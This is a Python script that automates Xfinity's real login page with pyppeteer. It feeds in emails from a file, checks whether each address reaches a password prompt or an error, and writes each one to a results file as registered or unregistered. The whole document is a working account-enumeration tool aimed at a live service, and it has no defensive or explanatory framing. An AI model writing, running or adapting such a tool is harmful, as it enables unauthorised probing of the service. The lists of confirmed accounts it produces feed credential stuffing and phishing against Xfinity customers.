import asyncio
import concurrent.futures
from pyppeteer import launch
from pyppeteer.errors import PageError

async def check_login(email, semaphore):
    async with semaphore:
        # Launch the browser
        browser = await launch(headless=False)
        page = await browser.newPage()

        # Navigate to Xfinity login page
        await page.goto('https://login.xfinity.com/login')

        try:
            await page.waitForSelector("#onetrust-accept-btn-handler", timeout=10000)
            await page.click("#onetrust-accept-btn-handler")
            await asyncio.sleep(1)
        except:
            pass

        # Enter email id
        await page.type('#user', email)
        await asyncio.sleep(1)

        # Press enter
        await page.click("#sign_in > prism-text")
        await asyncio.sleep(5)

        logindone = await page.xpath('//*[text()="Enter your password"]')
        nonreg = await page.xpath('//*[text()="The Xfinity ID or password you entered was incorrect. Please try again."]')

        result = ""
        if logindone:
            result = f"Registered|{email}\n"
        elif nonreg:
            result = f"UnRegistered|{email}\n"
        print(result)
        # Close the browser
        await browser.close()

        return result

async def write_results(results):
    with open("results.txt", "w") as f:
        for result in results:
            f.write(result)

async def main(emails):
    semaphore = asyncio.Semaphore(5)  # Limit concurrent coroutines to 5
    tasks = []
    for email in emails:
        task = asyncio.create_task(check_login(email, semaphore))
        tasks.append(task)

    results = await asyncio.gather(*tasks)
    await write_results(results)

if __name__ == "__main__":
    # Read emails from a text file
    with open("emails.txt", "r") as f:
        emails = f.read().splitlines()

    asyncio.run(main(emails))
